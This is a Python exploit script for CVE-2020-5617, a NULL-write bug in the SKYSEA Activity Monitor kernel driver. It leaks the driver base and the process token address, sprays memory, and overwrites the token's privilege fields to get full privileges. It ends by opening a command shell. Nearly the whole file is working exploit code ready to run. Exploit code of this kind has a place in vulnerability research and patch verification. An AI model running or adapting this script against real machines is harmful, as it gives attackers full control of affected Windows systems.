#!/usr/bin/python
#
# EoP exploit for arbitrary NULL write bug (CVE-2020-5617) in SKYSEA Activity Monitor Driver v2.0.4.0 written by @acru3l.
#

import sys
import struct
from ctypes import *
from ctypes.wintypes import *
import os

ioctl_SkyAM = 0x0022E403

device_name = r'\\.\SkyAMDrv'
driver_name = 'SkyAMDrv.sys'

hFile = None
heap_addrs = []
mark = struct.pack('<L', 0xdeadbeef)

PVOID = c_void_p

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    
    if hFile and hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    
    if hFile == -1:
        print('[-] Failed to open device: %s' % device_name)
        return False
    else:
        print('[+] Device opened successfully: %s' % device_name)
        return True

def call_ioctl(data, where):
    '''
    DeviceIoControl wrapper
    '''
    data_buff = create_string_buffer(data)
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [DWORD, DWORD, PVOID, DWORD, PVOID, DWORD, PVOID, PVOID]

    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_SkyAM,
        data_buff,
        len(data),
        where,
        0x10,
        byref(bytes_retn),
        0)

# Structures for NtQuerySystemInformation.
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

def find_handles(pid, data):
    '''
    parse the output of NtQuerySystemInformation
    '''
    header = cast(data, POINTER(SYSTEM_HANDLE_INFORMATION_EX))
    nentries = header[0].NumberOfHandles

    handles = []
    data = bytearray(data[16:])

    # Manually unpacking the struct because of issues with ctypes.parse
    #while nentries > 0:
    while len(data) >= 40:
        p = data[:40]
        e = struct.unpack('<QQQLHHLL', p)
        nentries -= 1
        data = data[40:]
        hpid = e[1]
        handle = e[2]

        if hpid != pid: continue
        handles.append((e[1], e[0], e[2]))

    return handles

def get_token_address():
    '''
    find the address of the saccess token
    '''
    STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
    SystemExtendedHandleInformation = 64
    TOKEN_QUERY = 8
    
    hProc = HANDLE(windll.kernel32.GetCurrentProcess())
    pid = windll.kernel32.GetCurrentProcessId()
    h = HANDLE()
    res = windll.advapi32.OpenProcessToken(hProc, TOKEN_QUERY, byref(h))
    if res == 0:
        print('[-] Error getting token handle: ')
        sys.exit(-1)

    # Find the handles associated with the current process.
    q = STATUS_INFO_LENGTH_MISMATCH
    out = DWORD(0)
    sz = 0
    #while q == STATUS_INFO_LENGTH_MISMATCH:
    while q != 0:
        sz += 0x1000
        handle_info = (c_ubyte * sz)()
        q = windll.ntdll.NtQuerySystemInformation(
                SystemExtendedHandleInformation,
                byref(handle_info),
                sz,
                byref(out)
            )

    # Parse handle_info to retrieve handles for the current PID
    handles = find_handles(pid, handle_info)
    hToken = filter(lambda x: x[0] == pid and x[2] == h.value, handles)

    if len(hToken) != 1: return None
    else: return hToken[0][1]

def get_driver_base():
    '''
    find base address of the driver
    '''
    array = c_ulonglong * 0x400
    addrs = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addrs), POINTER(LPVOID)),
            sizeof(addrs),
            byref(c_ulong(0)))
    if not res:
        return None

    windll.psapi.GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPSTR, DWORD]
    windll.psapi.GetDeviceDriverBaseNameA.restype = DWORD

    for addr in addrs:
        filename = create_string_buffer('0x00'*0x100)
        res = windll.psapi.GetDeviceDriverBaseNameA(
                addr,
                filename,
                0x100
            )
        #print filename.value
        if filename.value == driver_name:
            return addr

def heap_spray():
    '''
    spray payloads on the heap
    '''
    VirtualAlloc = windll.kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [LPVOID, DWORD, DWORD, DWORD]
    VirtualAlloc.restype = LPVOID

    size = 0x10000
    buff = 'A' * size
    PAGE_READONLY = 0x2
    PAGE_READWRITE = 0x4
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000

    payload = 'A'*0x40 + '\x01AAA' + mark + '\x00\x00\x00\x00' + 'AAAA' + '\x00' + 'A'*0x3

    for i in xrange(0xffff,0,-1):
        addr = VirtualAlloc(i * size, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not addr:
            continue
        if i % 0x100 == 0:
            #print '[+] Allocated memory at 0x%016x' % addr
            memmove(addr, buff, size)
            memmove(addr, payload, len(payload))
            heap_addrs.append(addr)
        else:
            memmove(addr, buff, size)

def change_target_dword(value):
    '''
    replace the mark DWORD on payloads
    '''
    for addr in heap_addrs:
        memmove(addr + 0x44, struct.pack('<L', value), 4)

def check():
    '''
    check if heap spraying succeeded
    '''
    test_buff = create_string_buffer('\x00'*0x10)
    call_ioctl('A' + 'C'*0xff, test_buff)

    return test_buff.raw[:4] == mark

if __name__ == '__main__':
    if not open_device():
        sys.exit(1)

    base_addr = get_driver_base()

    if base_addr:
        print '[+] Driver base addr: 0x%016x' % base_addr
    else:
        print '[+] Failed to leak base addr'
        eys.exit(1)

    print '[+] Leaking access token address...'
    token_addr = get_token_address()
    if token_addr:
        print('[+] Found access token at: 0x%016x' % token_addr)
    else:
        print('[-] Failed to find access token')
        sys.exit(1)

    print '[+] Performing heap spraying...'
    heap_spray()
    print '[+] Finished spraying heap'

    print '[+] Modifiying a kernel pointer...'
    call_ioctl('\x00', base_addr + 0x1BA34)
    call_ioctl('\x00', base_addr + 0x1BA2F)

    if not check():
        call_ioctl('\x00', base_addr + 0x1BA28)
        print '[-] Exploit failed and restored system state'
        sys.exit(1)

    # Privileges -> Present: 0x0000001e`73deff20
    change_target_dword(0x73deff20)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x40)
    change_target_dword(0x0000001e)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x44)
    
    # Privileges -> Enabled: 0xffffffff`ffffffff
    # Privileges -> Default: 0xffffffff`ffffffff
    change_target_dword(0xffffffff)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x48)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x4C)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x50)
    call_ioctl('A' + 'C'*0xff, token_addr + 0x54)

    # restore system state
    call_ioctl('\x00', base_addr + 0x1BA28)

    print '[+] Exploit success! Enjoy your high privilege state :))'
    os.system('cmd.exe')

